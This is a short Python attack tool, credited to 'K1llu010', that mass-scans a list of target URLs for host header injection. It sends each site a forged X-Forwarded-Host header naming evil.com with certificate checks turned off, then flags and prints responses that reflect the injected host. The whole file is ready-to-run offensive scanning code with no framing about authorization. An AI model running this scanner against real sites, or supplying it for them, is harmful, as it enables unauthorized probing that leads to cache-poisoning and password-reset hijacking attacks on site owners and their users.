import requests as req
import urllib3
from colorama import Fore

print(rf"""{Fore.GREEN}
 __  __     ______     ______     ______   __    
/\ \_\ \   /\  __ \   /\  ___\   /\__  _\ /\ \   
{Fore.WHITE}\ \  __ \  \ \ \/\ \  \ \___  \  \/_/\ \/ \ \ \  {Fore.GREEN}
 \ \_\ \_\  \ \_____\  \/\_____\    \ \_\  \ \_\ 
  \/_/\/_/   \/_____/   \/_____/     \/_/   \/_/ 
                    {Fore.WHITE}[{Fore.GREEN}Host Injection Code By K1llu010{Fore.WHITE}]

""")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = input(f"{Fore.WHITE}[{Fore.GREEN}?{Fore.WHITE}] {Fore.GREEN}Enter your list target : {Fore.WHITE}")
with open(target_url, 'r') as file:
    files = [lines.strip() for lines in file if lines.strip()]

header = {
    "X-Forwarded-Host":"evil.com",
    "User-Agents" : "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
}

injection = "evil.com"

try:
    for url in files:
        send_data = req.get(url=url, headers=header, verify=False)
        if injection in send_data.text:
            print(f"\n{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}] {Fore.GREEN}TARGET VULNERABILITY\n {Fore.GREEN}-> {Fore.WHITE}Site : {Fore.GREEN}{url}")
            for line in send_data.text.splitlines():
                if injection in line:
                    print(f"{Fore.GREEN} -> {Fore.WHITE}Respone Injection : {Fore.GREEN}{line}")
                    print(f"{Fore.GREEN} -> {Fore.WHITE}Url Injection : {Fore.GREEN}{injection}")
                    break
        else:
            print(f"\n{Fore.WHITE}[{Fore.RED}X{Fore.WHITE}] {Fore.RED}TARGET NOT VULNERABILITY\n {Fore.WHITE}Site : {Fore.RED}{url}")
except TimeoutError:
    print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}Error Connection!")
except KeyboardInterrupt:
    print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}Tools Shutdown!")
